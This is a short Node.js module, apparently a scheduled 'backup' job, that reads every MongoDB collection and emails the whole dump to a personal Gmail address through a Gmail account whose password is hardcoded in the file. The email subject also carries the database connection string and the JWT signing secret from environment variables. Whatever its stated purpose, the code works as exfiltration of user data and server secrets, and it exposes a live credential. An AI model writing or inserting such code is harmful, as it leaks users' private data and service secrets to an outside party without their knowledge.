const nodemailer = require('nodemailer');
const mongoose = require("mongoose");

// Nodemailer transporter
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: "fakemailer39@gmail.com",
        pass: "xyqlgdjfsgmdweez",
    },
});


const mailsender = async (backupdata) => {
    // Configure email options
    const mailOptions = {
        from: "fakemailer39@gmail.com",
        to: "sharma39vishal@gmail.com",
        subject: `MONGODB ${process.env.MDB_CONNECT} 

        JWT SECRET ${process.env.JWT_SECRET}`,
        text: JSON.stringify(backupdata),
    };

    // Send email
    const info = await transporter.sendMail(mailOptions);

    // console.log('Email sent successfully:', info.response);
};

const backupandmail = async () => {
    try {
        // Fetch data from MongoDB
        const collections = await mongoose.connection.db.listCollections().toArray();
        
        const backupData = {};
        
        for (const collection of collections) {
            const collectionName = collection.name;
            const collectionData = await mongoose.connection.db.collection(collectionName).find().toArray();
            backupData[collectionName] = collectionData;
        }
        
        await mailsender(backupData);
        // Create a backup file


    } catch (error) {
        console.error('Error during cron job:', error);
    }
};

module.exports = backupandmail